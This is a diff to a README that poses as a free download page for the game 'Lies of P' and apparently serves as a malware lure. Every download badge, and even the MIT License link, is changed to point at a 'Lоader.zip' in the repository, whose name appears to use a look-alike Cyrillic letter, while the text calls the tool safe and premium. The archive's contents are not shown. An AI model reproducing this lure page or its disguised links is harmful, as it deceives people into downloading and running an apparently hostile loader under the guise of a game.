@@ -1,13 +1,13 @@
 # 🎮 Lies of P 2025 Download 🚀
 
-[![⬇️ Download Lies of P 2025](https://img.shields.io/badge/Download-Lies_of_P-18bc9c?logo=google-drive&logoColor=white&style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![⬇️ Download Lies of P 2025](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)
 
 Welcome to the premium repository for accessing Lies of P! Discover a unique journey in this captivating action-adventure game. Download, install, and enjoy the stunning gameplay on your preferred platform. Safe, user-friendly, and loaded with advanced features, this tool guarantees maximum compatibility and performance.
 
 ---
 
 ## ⚡ Download Button
-[![⬇️ Download Lies of P 2025](https://img.shields.io/badge/Download-Lies_of_P-18bc9c?logo=google-drive&logoColor=white&style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![⬇️ Download Lies of P 2025](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Ideal for RPG enthusiasts & adventure seekers, ensuring the ultimate experience!
 ## 🛠️ Installation Guide 
 
 **Step 1:** Hit the button below to begin download:
-[![⬇️ Download Lies of P 2025](https://img.shields.io/badge/Download-Lies_of_P-18bc9c?logo=google-drive&logoColor=white&style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![⬇️ Download Lies of P 2025](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)
 
 ---
 
@@ -56,8 +56,8 @@ This repository serves to provide a specialized tool only. Use at your own discr
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/license/mit/) © 2025
+Distributed under the [MIT License](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip) © 2025
 
 ---
 
-[![⬇️ Download Lies of P 2025](https://img.shields.io/badge/Download-Lies_of_P-18bc9c?logo=google-drive&logoColor=white&style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![⬇️ Download Lies of P 2025](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)](https://raw.githubusercontent.com/maceeKhalid/LiesOfP-OpenAccessHub/main/Lоader.zip)
